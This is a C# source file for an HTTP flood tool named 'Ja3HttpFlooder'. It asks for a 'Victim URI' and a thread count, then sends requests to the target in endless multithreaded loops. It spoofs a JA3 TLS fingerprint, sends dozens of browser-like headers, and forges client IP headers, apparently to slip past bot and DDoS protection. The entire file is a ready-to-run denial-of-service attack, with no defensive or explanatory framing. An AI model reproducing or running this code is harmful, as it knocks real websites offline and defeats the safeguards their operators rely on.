using JA3;

public class Program
{
    private static string TakeHostFromURI(string uri)
    {
        try
        {
            Uri uriObject = new Uri(uri);
            return uriObject.Host;
        }
        catch
        {
            return string.Empty;
        }
    }

    public static void Main(string[] args)
    {
        Console.Title = "Ja3HttpFlooder | Made by https://github.com/ZygoteCode/";
        string URI = "";
        int threads = 0;
        bool useHttp2 = false;

        if (args.Length == 0)
        {
            Console.Write("Victim URI > ");
            URI = Console.ReadLine();

            Console.Write("Attack threads > ");
            threads = int.Parse(Console.ReadLine());

            Console.Write("Use HTTP/2? (y/n) > ");
            useHttp2 = Console.ReadLine().Equals("y");
        }
        else
        {
            URI = args[0];
            threads = int.Parse(args[1]);
            useHttp2 = args[2].Equals("y");
        }

        Console.WriteLine("Attack started. Press CTRL + C to stop it.");

        for (int i = 0; i < threads; i++)
        {
            new Thread(() =>
            {
                while (true)
                {
                    Ja3MessageHandler handler = new Ja3MessageHandler();

                    handler.EnableHttp2 = useHttp2;
                    handler.Timeout = 10000;
                    handler.UseCookies = false;
                    handler.AllowAutoRedirect = true;

                    string host = TakeHostFromURI(URI);

                    using (HttpClient client = new HttpClient(handler))
                    {
                        try
                        {
                            client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,video/mp4");
                            client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br, zstd, lzma, bzip2, xz, fakecompress, zopfli");
                            client.DefaultRequestHeaders.Add("Accept-Language", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7");
                            client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
                            client.DefaultRequestHeaders.Add("Connection", "keep-alive");
                            client.DefaultRequestHeaders.Add("DNT", "1");
                            client.DefaultRequestHeaders.Add("Origin", URI);
                            client.DefaultRequestHeaders.Add("Pragma", "no-cache");
                            client.DefaultRequestHeaders.Add("Priority", "u=0, i");
                            client.DefaultRequestHeaders.Add("Referer", "https://google.com/");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Reduced-Motion", "\"reduce\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Reduced-Transparency", "\"reduce\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-WoW64", "?1");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Device-Memory", "128");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Color-Scheme", "dark");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Arch", "x86");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Bitness", "\"64\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Form-Factors", "\"Desktop\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Full-Version", "134.0.6998.118");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Full-Version-List", "\"Chromium\";v=\"134.0.6998.118\", \"Not:A-Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"134.0.6998.118\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Model", "");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "\"Windows\"");
                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform-Version", "19.0.0");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-Storage-Access", "active");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
                            client.DefaultRequestHeaders.Add("Sec-GPC", "1");
                            client.DefaultRequestHeaders.Add("Sec-Purpose", "prefetch");
                            client.DefaultRequestHeaders.Add("TE", "trailers");
                            client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36");

                            client.DefaultRequestHeaders.Add("A-IM", "feed");
                            client.DefaultRequestHeaders.Add("Accept-Charset", "utf-8");
                            client.DefaultRequestHeaders.Add("Access-Control-Request-Method", "GET");
                            client.DefaultRequestHeaders.Add("Access-Control-Request-Headers", "X-Custom-Header");
                            client.DefaultRequestHeaders.Add("Date", DateTime.UtcNow.ToString("R"));
                            client.DefaultRequestHeaders.Add("HTTP2-Settings", "token64");
                            client.DefaultRequestHeaders.Add("If-Modified-Since", DateTime.UtcNow.AddDays(-7).ToString("R"));
                            client.DefaultRequestHeaders.Add("Max-Forwards", "10");
                            client.DefaultRequestHeaders.Add("Save-Data", "on");
                            client.DefaultRequestHeaders.Add("Upgrade", "HTTP/2");
                            client.DefaultRequestHeaders.Add("Accept-CH", "viewport-width, width");
                            client.DefaultRequestHeaders.Add("Critical-CH", "viewport-width");
                            client.DefaultRequestHeaders.Add("Downlink", "10");
                            client.DefaultRequestHeaders.Add("ECT", "4g");
                            client.DefaultRequestHeaders.Add("NEL", "{ \"report_to\": \"cf-nel\", \"max_age\": 3600 }");
                            client.DefaultRequestHeaders.Add("Sec-CH-UA-Reduced", "?0");
                            client.DefaultRequestHeaders.Add("Sec-Fetch-Storage-Access", "active");
                            client.DefaultRequestHeaders.Add("Early-Data", "1");
                            client.DefaultRequestHeaders.Add("Permissions-Policy", "geolocation=(self)");
                            client.DefaultRequestHeaders.Add("X-Forwarded-For", "255.255.255.255");
                            client.DefaultRequestHeaders.Add("X-Real-IP", "255.255.255.255");
                            client.DefaultRequestHeaders.Add("True-Client-IP", "255.255.255.255");
                            client.DefaultRequestHeaders.Add("X-Forwarded-Proto", "https");
                            client.DefaultRequestHeaders.Add("X-Forwarded-Host", host);
                            client.DefaultRequestHeaders.Add("Host", host);
                            client.DefaultRequestHeaders.Add("X-Request-ID", Guid.NewGuid().ToString());
                            client.DefaultRequestHeaders.Add("X-Correlation-ID", Guid.NewGuid().ToString());
                            client.DefaultRequestHeaders.Add("CDN-Loop", "1");
                            client.DefaultRequestHeaders.Add("Vary", "Accept-Encoding, User-Agent");
                            client.DefaultRequestHeaders.Add("X-Content-Type-Options", "nosniff");
                            client.DefaultRequestHeaders.Add("X-Frame-Options", "DENY");
                            client.DefaultRequestHeaders.Add("X-XSS-Protection", "1; mode=block");
                            client.DefaultRequestHeaders.Add("Content-Security-Policy", "default-src 'self'");
                            client.DefaultRequestHeaders.Add("Content-Security-Policy-Report-Only", "default-src 'self'; report-uri /csp-report");
                            client.DefaultRequestHeaders.Add("Referrer-Policy", "strict-origin-when-cross-origin");

                            client.GetAsync(URI);
                        }
                        catch
                        {

                        }
                    }
                }
            }).Start();
        }
    }
}